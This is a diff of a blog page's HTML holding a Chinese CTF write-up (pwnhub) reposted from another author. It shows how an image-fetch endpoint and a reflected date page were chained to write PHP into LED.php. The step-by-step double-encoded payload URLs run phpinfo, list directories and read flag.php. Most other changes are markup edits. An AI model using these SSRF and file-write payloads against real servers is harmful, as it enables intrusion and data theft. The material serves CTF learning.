@@ -234,7 +234,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwnhub–胖哈勃外传第一集wp"><span class="post-toc-number">1.</span> <span class="post-toc-text">pwnhub–胖哈勃外传第一集wp</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-number">1.</span> <span class="post-toc-text">pwnhub--胖哈勃外传第一集wp</span></a></li></ol>
 
         <!--
         <li class="mdl-menu__item">
@@ -388,24 +388,29 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h3 id="pwnhub–胖哈勃外传第一集wp"><a href="#pwnhub–胖哈勃外传第一集wp" class="headerlink" title="pwnhub–胖哈勃外传第一集wp"></a>pwnhub–胖哈勃外传第一集wp</h3><p>首先看看网站。在首页的源码里面有这样一部分很奇怪</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=&quot;http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
+        <h3>pwnhub--胖哈勃外传第一集wp</h3>
+<p>首先看看网站。在首页的源码里面有这样一部分很奇怪</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=&quot;http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>访问下，说是logo.jpg更新成功。</p>
 <p>试了几下，发现以下几点</p>
 <blockquote>
 <p>1、首先这个链接是访问file指向的链接，并将返回的内容写到path指向的文件</p>
+</blockquote>
+<blockquote>
 <p>2、file指向的连接必须是127.0.0.1的，不太好绕过</p>
+</blockquote>
+<blockquote>
 <p>3、path可以是.PHP后缀的文件，但是过滤的尖括号，没有办法二次访问直接webshell。</p>
 </blockquote>
-<a id="more"></a>
+<p>&lt;!--more--&gt;</p>
 <p>综上思路就是想办法在本站下找一个地方可以写webshell的，然后通过这个image.php直接写webshell。</p>
 <p>但是刚才说了没有办法二次访问image.php直接写webshell。</p>
 <p>所以还要另外找地方。</p>
-<p>然后发现这个地方<a href="http://54.223.231.220/?date/2016-07/" target="_blank" rel="external">http://54.223.231.220/?date/2016-07/</a></p>
+<p>然后发现这个地方http://54.223.231.220/?date/2016-07/</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/61.png" alt=""></p>
 <p>日期被直接打印出来了，那么我们试试，果然这里可以打印链接上的内容，所以构造poc如下：(注意要二次url编码)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520phpinfo%2528%2529%253B%2520%253F%253E%2f&amp;path=LED.php</div></pre></td></tr></table></figure>
-<p>访问<a href="http://54.223.231.220/LED.php，截图如下：" target="_blank" rel="external">http://54.223.231.220/LED.php，截图如下：</a></p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520phpinfo%2528%2529%253B%2520%253F%253E%2f&amp;path=LED.php</div></pre></td></tr></table></figure></p>
+<p>访问http://54.223.231.220/LED.php，截图如下：</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/62.png" alt=""></p>
 <p>成功了，那么看看被禁用的函数：</p>
 <blockquote>
@@ -413,14 +418,15 @@
 </blockquote>
 <p>几乎所有执行命令的函数都被禁用了。</p>
 <p>那么先用glob遍历下目录吧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520foreach%2528glob%2528%2522.%252f%252a%2522%2529%2520as%2520%2524bdw%2529%257B%2520%2520echo%2520%2524bdw.%2522%253Cbr%253E%2522%253B%2520%257D%253F%253E%2f&amp;path=LED.php</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520foreach%2528glob%2528%2522.%252f%252a%2522%2529%2520as%2520%2524bdw%2529%257B%2520%2520echo%2520%2524bdw.%2522%253Cbr%253E%2522%253B%2520%257D%253F%253E%2f&amp;path=LED.php</div></pre></td></tr></table></figure></p>
 <p>访问截图如下：</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/63.png" alt=""></p>
 <p>发现一个flag.php,直接读取内容看看，poc如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520echo%2520file_get_contents%2528%2527flag.php%2527%2529%253B%253F%253E%2f&amp;path=LED.php</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520echo%2520file_get_contents%2528%2527flag.php%2527%2529%253B%253F%253E%2f&amp;path=LED.php</div></pre></td></tr></table></figure></p>
 <p>截图如下，拿到flag</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/60.png" alt=""></p>
-<p>ps:转载于大牛bendawang<br><a href="http://blog.csdn.net/qq_19876131/article/details/53671632" target="_blank" rel="external">blog地址</a></p>
+<p>ps:转载于大牛bendawang
+<a href="http://blog.csdn.net/qq_19876131/article/details/53671632" target="_blank" rel="external">blog地址</a></p>
 
     
 
@@ -590,6 +596,14 @@
     
 
     <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">15</span>
+            </a>
+        </li>
+        
     
 </ul>
 
